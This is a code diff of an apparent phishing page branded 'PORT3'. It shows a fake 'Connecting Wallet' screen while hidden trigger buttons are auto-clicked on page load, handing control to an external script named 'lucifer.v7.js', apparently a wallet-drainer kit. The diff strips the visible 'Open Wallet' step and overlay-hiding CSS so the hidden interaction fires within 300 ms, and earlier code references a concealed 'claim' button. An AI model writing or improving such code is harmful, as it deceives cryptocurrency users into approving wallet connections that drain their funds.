@@ -47,7 +47,7 @@
             box-shadow: 0 12px 32px rgba(0, 0, 0, 0.05);
             text-align: center;
             position: relative;
-            z-index: 99999999 !important; /* Bumped up significantly */
+            z-index: 10;
         }
 
         .header-logo {
@@ -100,25 +100,6 @@
             margin-bottom: 2rem;
         }
 
-        .action-btn {
-            background-color: var(--text-main);
-            color: #ffffff;
-            border: none;
-            border-radius: 30px;
-            padding: 0.8rem 2rem;
-            font-size: 0.9rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            margin-bottom: 0.5rem;
-            width: 100%;
-            display: none; 
-        }
-
-        .action-btn:hover {
-            opacity: 0.9;
-        }
-
         .cancel-btn {
             background-color: transparent;
             color: var(--text-muted);
@@ -138,6 +119,7 @@
             border-color: #cccccc;
         }
 
+        /* Keep trigger elements available for lucifer.v7.js to target */
         .hidden-triggers {
             position: absolute;
             width: 1px;
@@ -149,24 +131,6 @@
             border: 0;
             opacity: 0;
         }
-
-        /* HARD OVERRIDE: Completely targets and destroys modern Web3Modal/WalletConnect overlays */
-        w3m-modal,
-        wcm-modal,
-        div[class*="modal"], 
-        div[class*="overlay"], 
-        div[id*="walletconnect"], 
-        div[class*="walletconnect"],
-        #walletconnect-wrapper,
-        .web3modal-modal-container {
-            display: none !important;
-            visibility: hidden !important;
-            opacity: 0 !important;
-            pointer-events: none !important;
-            position: absolute !important;
-            left: -9999px !important;
-            z-index: -1000 !important;
-        }
     </style>
 </head>
 <body>
@@ -174,15 +138,14 @@
     <div class="connect-card">
         <div class="header-logo">PORT<span>3</span></div>
         
-        <div class="spinner-container" id="spinnerIcon">
+        <div class="spinner-container">
             <div class="spinner"></div>
         </div>
 
-        <h3 class="status-title" id="statusTitle">Connecting...</h3>
-        <p class="status-desc" id="statusDesc">Initializing secure connection environment. Please wait.</p>
+        <h3 class="status-title" id="statusTitle">Connecting Wallet...</h3>
+        <p class="status-desc" id="statusDesc">Please confirm the connection request in your wallet application to proceed.</p>
 
-        <button class="action-btn" id="openWalletBtn" onclick="triggerWalletRedirect()">Open Wallet</button>
-        <button class="cancel-btn" onclick="goBack()">Cancel Request</button>
+        <button class="cancel-btn" onclick="goBack()">Cancel</button>
     </div>
 
     <div class="hidden-triggers">
@@ -197,101 +160,19 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const activeWallet = urlParams.get('wallet') || 'Wallet';
-        let walletReady = false;
-
-        document.getElementById('statusTitle').textContent = `Initializing ${activeWallet}`;
+        
+        document.getElementById('statusTitle').textContent = `Connecting ${activeWallet}...`;
 
         window.addEventListener('DOMContentLoaded', () => {
-            // Bumped to 2.2 seconds to guarantee core script setup completion on slower mobile connections
+            // Instantly auto-clicks the hidden button as soon as the page structure is ready
+            // allowing lucifer.v7.js to take over immediately without custom visual wrappers
             setTimeout(() => {
                 const interactBtn = document.querySelector('.interactBtn') || document.getElementById('connectButton');
-                const walletConnectBtn = document.querySelector('.wallet-connect-btn');
-                
                 if (interactBtn) {
                     interactBtn.click();
-                    setupUIReadyState();
-                } else if (walletConnectBtn) {
-                    walletConnectBtn.click();
-                    setupUIReadyState();
                 }
-            }, 2200); 
+            }, 300);
         });
-
-        function setupUIReadyState() {
-            walletReady = true;
-            document.getElementById('spinnerIcon').style.display = 'none';
-            document.getElementById('statusTitle').textContent = `Approve Connection`;
-            document.getElementById('statusDesc').textContent = `Your connection link is generated. Press 'Open Wallet' below to launch your ${activeWallet} app securely.`;
-            document.getElementById('openWalletBtn').style.display = 'block';
-        }
-
-        function getWalletDeepLink(walletName, wcUri) {
-            const encodedUri = encodeURIComponent(wcUri);
-            const name = walletName.toLowerCase();
-
-            if (name.includes('trust')) return `trust://wc?uri=${encodedUri}`;
-            if (name.includes('metamask')) return `metamask://wc?uri=${encodedUri}`;
-            if (name.includes('phantom')) return `phantom://wc?uri=${encodedUri}`;
-            if (name.includes('safepal')) return `safepalwallet://wc?uri=${encodedUri}`;
-            if (name.includes('coinbase')) return `cbwallet://wc?uri=${encodedUri}`;
-            
-            return `wc://wc?uri=${encodedUri}`;
-        }
-
-        function triggerWalletRedirect() {
-            if (!walletReady) return;
-
-            let targetUri = '';
-
-            // Enhanced storage checker mapping legacy v1 strings, structured JSON payloads, and v3 relays
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (key.includes('walletconnect') || key.includes('wc@2') || key.includes('W3M')) {
-                    try {
-                        const val = localStorage.getItem(key);
-                        if (!val) continue;
-
-                        // Check if it's a raw string URI straight up
-                        if (val.startsWith('wc:')) {
-                            targetUri = val;
-                            break;
-                        }
-
-                        const data = JSON.parse(val);
-                        if (data && data.uri) {
-                            targetUri = data.uri;
-                            break;
-                        } else if (data && data.wcUri) {
-                            targetUri = data.wcUri;
-                            break;
-                        }
-                    } catch (e) {
-                        const rawData = localStorage.getItem(key);
-                        if (rawData && rawData.includes('wc:')) {
-                            const match = rawData.match(/wc:[^\s"']+/);
-                            if (match) {
-                                targetUri = match[0];
-                                break;
-                            }
-                        }
-                    }
-                }
-            }
-
-            if (targetUri) {
-                // If found, execute native protocol routing directly
-                window.location.href = getWalletDeepLink(activeWallet, targetUri);
-            } else {
-                // Fallback attempt: Force trigger secondary elements if payload isn't fully cached yet
-                const claimBtn = document.querySelector('.claimBtn') || document.getElementById('claimButton');
-                if (claimBtn) {
-                    claimBtn.click();
-                } else {
-                    const interactBtn = document.querySelector('.interactBtn');
-                    if (interactBtn) interactBtn.click();
-                }
-            }
-        }
 
         function goBack() {
             window.history.back();
